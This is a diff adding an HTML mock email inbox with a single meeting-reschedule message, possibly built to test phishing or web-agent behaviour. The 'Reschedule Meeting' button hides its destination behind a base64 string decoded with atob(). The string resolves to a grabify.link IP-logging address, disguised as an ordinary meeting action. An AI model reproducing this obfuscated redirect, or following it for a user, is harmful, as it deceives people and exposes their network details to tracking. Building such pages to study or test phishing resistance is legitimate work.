@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email Inbox</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      width: 80%;
+      max-width: 1200px;
+      background-color: white;
+      margin: 20px auto;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    h1 {
+      text-align: center;
+      color: #333;
+    }
+    .inbox {
+      display: flex;
+    }
+    .email-list {
+      width: 30%;
+      background-color: #fafafa;
+      padding: 10px;
+      border-radius: 8px;
+    }
+    .email-item {
+      padding: 10px;
+      border-bottom: 1px solid #ddd;
+      cursor: pointer;
+    }
+    .email-item:hover {
+      background-color: #e6e6e6;
+    }
+    .email-header {
+      font-weight: bold;
+    }
+    .email-sender {
+      color: #4a90e2;
+    }
+    .email-subject {
+      color: #333;
+    }
+    .email-summary {
+      font-size: 14px;
+      color: #777;
+    }
+    .email-content {
+      width: 70%;
+      padding: 20px;
+      margin-left: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+    }
+    .content-header h2 {
+      color: #333;
+    }
+    .content-header p {
+      font-size: 14px;
+      color: #777;
+    }
+    .content-body p {
+      font-size: 16px;
+      line-height: 1.5;
+      color: #333;
+    }
+    .button {
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+    }
+    .button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Email Inbox</h1>
+    </header>
+
+    <section class="inbox">
+      <div class="email-list">
+        <div class="email-item">
+          <div class="email-header">
+            <span class="email-sender">John Doe</span> - 
+            <span class="email-subject">Meeting Update</span>
+          </div>
+          <div class="email-summary">
+            <p class="email-preview">Hi there, we need to reschedule the meeting for next week...</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="email-content">
+        <div class="content-header">
+          <h2>Meeting Update</h2>
+          <p><strong>From:</strong> John Doe</p>
+          <p><strong>To:</strong> You</p>
+          <p><strong>Date:</strong> March 9, 2025</p>
+        </div>
+        <div class="content-body">
+          <p>Hi there,</p>
+          <p>We need to reschedule the meeting for next week. Let me know what time works best for you.</p>
+          <p>Best regards,</p>
+          <p>John</p>
+        </div>
+
+        <!-- Button to Reschedule Meeting using Base64 encoded URL -->
+        <button class="button" onclick="window.location.href=atob('aHR0cHM6Ly9ncmFiaWZ5LmxpbmsvSU5TS002');">Reschedule Meeting</button>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    // You can add any additional JavaScript here if needed.
+  </script>
+</body>
+</html>
